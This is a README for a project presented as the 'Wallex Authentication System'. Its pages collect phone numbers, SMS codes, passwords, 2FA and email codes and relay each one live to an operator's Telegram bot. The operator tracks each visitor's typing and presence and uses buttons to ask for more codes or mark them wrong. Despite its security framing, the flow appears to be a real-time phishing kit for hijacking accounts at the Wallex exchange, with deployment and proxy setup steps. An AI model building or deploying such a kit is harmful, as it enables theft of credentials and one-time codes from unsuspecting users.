# Wallex Authentication System

A comprehensive real-time authentication system with Telegram integration and presence tracking.

## 🚀 Features

- **Multi-step Authentication**: Phone, SMS, Password, 2FA, Email verification
- **Real-time Presence Tracking**: Online/Away/Offline status detection
- **Telegram Integration**: Admin notifications and control via Telegram bot
- **Live Typing Detection**: Real-time typing indicators across all forms
- **Admin Control Panel**: Remote authentication approval via Telegram
- **Persian/English Support**: Localized interface with English Telegram messages
- **Responsive Design**: Modern UI with Tailwind CSS and shadcn/ui components
- **Session Management**: Secure session handling with automatic cleanup
- **Error Recovery**: Robust error handling and automatic retry mechanisms

## 🏗️ Architecture

### Core Components

- **RealtimePresenceTracker**: High-performance presence tracking engine
- **TelegramService**: Enhanced Telegram bot integration
- **SessionManagement**: Secure session handling and validation
- **AdminControl**: Authorization and access control system

### Real-time Features

- **Presence States**: online (🟢), away (🟡), offline (🔴), typing (⌨️)
- **Event-driven Architecture**: Optimized for performance and reliability
- **Smart Updates**: Intelligent message updates to reduce API calls
- **Cross-page Tracking**: Seamless presence tracking across all pages

## 📦 Installation

### Prerequisites

- Node.js 18+
- npm/yarn/pnpm
- Telegram Bot Token
- Admin Chat ID

### Quick Start

1. **Clone the repository**

   ```bash
   git clone <repository-url>
   cd wallex-auth
   ```

2. **Install dependencies**

   ```bash
   npm install
   ```

3. **Environment Setup**

   ```bash
   cp .env.example .env
   ```

4. **Configure Telegram Bot**

   - Message @BotFather on Telegram to create a new bot
   - Get your bot token from BotFather
   - Message @userinfobot to get your chat ID
   - Update `.env` file:

   ```env
   VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
   VITE_TELEGRAM_CHAT_ID=your_chat_id_here
   ```

5. **Start Development Server**

   ```bash
   npm run dev
   ```

6. **Build for Production**
   ```bash
   npm run build
   ```

## ⚙️ Configuration

### Environment Variables

| Variable                  | Description                                   | Required |
| ------------------------- | --------------------------------------------- | -------- |
| `VITE_TELEGRAM_BOT_TOKEN` | Telegram bot token from @BotFather            | Yes      |
| `VITE_TELEGRAM_CHAT_ID`   | Your Telegram chat ID for admin notifications | Yes      |

### Telegram Bot Setup

1. **Create Bot**

   - Open Telegram and message @BotFather
   - Send `/newbot` command
   - Follow the prompts to create your bot
   - Save the token provided

2. **Get Chat ID**

   - Message @userinfobot on Telegram
   - Copy your chat ID
   - Alternatively, message your bot and check webhook logs

3. **Configure Webhook (Optional)**
   - For advanced features, you can set up webhooks
   - Use the included Cloudflare Worker for Iran IP bypass

## 🎯 Usage

### For Users

1. **Phone Number Entry**: Enter your phone number to begin authentication
2. **SMS Verification**: Enter the SMS verification code received
3. **Loading Page**: Wait for admin approval while the system tracks your presence
4. **Additional Auth**: Complete password, 2FA, or email verification as requested
5. **Success**: Gain access upon admin approval

### For Admins

1. **Telegram Notifications**: Receive real-time notifications for new authentication attempts
2. **Admin Buttons**: Use inline keyboard buttons to guide users through authentication
3. **Presence Monitoring**: See real-time user activity (online/away/offline/typing)
4. **Quick Actions**: Approve, request additional verification, or reject attempts
5. **Session Management**: Monitor multiple users simultaneously

### Admin Button Guide

- **🔐 PASSWORD**: Request password verification
- **📲 2FA**: Request Google Authenticator code
- **📧 EMAIL**: Request email verification
- **❌ WRONG #**: Mark SMS code as incorrect
- **🚫 PASS/2FA/EMAIL**: Mark respective codes as wrong
- **✅ APPROVE & GRANT ACCESS**: Complete authentication process

## 🔧 Development

### Project Structure

```
src/
├── components/           # React components
│   ├── ui/              # shadcn/ui components
│   ├── LoginForm.tsx    # Main login form
│   ├── OTPInput.tsx     # OTP input component
│   └── RealtimePresenceProvider.tsx
├── hooks/               # Custom React hooks
���   └── useRealtimePresence.ts
├── lib/                 # Core business logic
│   ├── realtime-presence-tracker.ts
│   ├── telegram-service-enhanced.ts
│   ├── admin-control.ts
│   ├── session-cleanup.ts
│   └── utils.ts
├── pages/               # Route components
│   ├── Index.tsx        # Landing page
│   ├── Loading.tsx      # Admin approval page
│   ├── AuthSMS.tsx      # SMS verification
│   ├── AuthPassword.tsx # Password verification
│   ├── AuthGoogle.tsx   # 2FA verification
│   └── AuthEmail.tsx    # Email verification
└── App.tsx              # Main app component
```

### Key Technologies

- **React 18**: Frontend framework
- **TypeScript**: Type safety and developer experience
- **Vite**: Fast build tool and dev server
- **Tailwind CSS**: Utility-first CSS framework
- **shadcn/ui**: Beautiful, accessible UI components
- **React Router**: Client-side routing
- **React Hook Form**: Form handling and validation
- **Framer Motion**: Smooth animations
- **Telegram Bot API**: Real-time notifications

### Development Commands

```bash
npm run dev          # Start development server
npm run build        # Build for production
npm run typecheck    # Run TypeScript checks
npm run format.fix   # Format code with Prettier
npm run test         # Run tests
```

## 🔒 Security Features

- **Session Validation**: Automatic session cleanup and validation
- **Admin Authorization**: Multi-level admin access control
- **Rate Limiting**: Smart rate limiting for Telegram API calls
- **Input Sanitization**: HTML escaping and input validation
- **Error Boundaries**: Graceful error handling and recovery
- **HTTPS Only**: Secure communication channels

## 📱 Mobile Support

- **Responsive Design**: Optimized for all screen sizes
- **Touch-friendly**: Large touch targets and smooth interactions
- **Mobile Keyboards**: Optimized input types for mobile devices
- **Performance**: Fast loading and smooth animations on mobile

## 🌐 Cloudflare Worker (Optional)

For users in Iran or regions with Telegram restrictions, a Cloudflare Worker proxy is included:

```javascript
// cloudflare-worker/telegram-proxy.js
// Deploy this to Cloudflare Workers for IP bypass
```

Update the API base URL in `telegram-service-enhanced.ts` to use your worker.

## 🚀 Production Deployment

### Vercel (Recommended)

1. Push code to GitHub/GitLab
2. Connect repository to Vercel
3. Add environment variables in Vercel dashboard
4. Deploy automatically

### Netlify

1. Build the project: `npm run build`
2. Upload `dist` folder to Netlify
3. Configure environment variables
4. Set up continuous deployment

### Self-hosted

1. Build: `npm run build`
2. Serve `dist` folder with any static file server
3. Configure environment variables
4. Set up SSL certificate

## 🔍 Troubleshooting

### Common Issues

**Telegram messages not sending:**

- Check bot token and chat ID in `.env`
- Verify bot has permission to send messages
- Check network connectivity and proxy settings

**Presence tracking not working:**

- Ensure JavaScript is enabled
- Check browser console for errors
- Verify session is created properly

**Build errors:**

- Run `npm run typecheck` to check TypeScript errors
- Update dependencies: `npm update`
- Clear cache: `rm -rf node_modules package-lock.json && npm install`

### Debug Mode

Set localStorage debug flag to see detailed logs:

```javascript
localStorage.setItem("debug-presence", "true");
```

### Performance Monitoring

Monitor performance metrics:

- Session creation time
- Presence update frequency
- Telegram API response times
- Memory usage

## 🤝 Contributing

1. Fork the repository
2. Create feature branch: `git checkout -b feature/new-feature`
3. Commit changes: `git commit -am 'Add new feature'`
4. Push to branch: `git push origin feature/new-feature`
5. Submit pull request

## 📝 License

This project is licensed under the MIT License. See LICENSE file for details.

## 🆘 Support

For support and questions:

- Check the troubleshooting section above
- Review GitHub issues
- Create new issue with detailed description

## 🔄 Changelog

### v1.0.0 (Current)

- ✅ Complete real-time presence tracking system
- ✅ Telegram integration with admin controls
- ✅ Multi-step authentication flow
- ✅ Session management and cleanup
- ✅ English status messages in Telegram
- ✅ Production-ready codebase
- ✅ Comprehensive documentation

---

**Built with ❤️ for secure, real-time authentication**
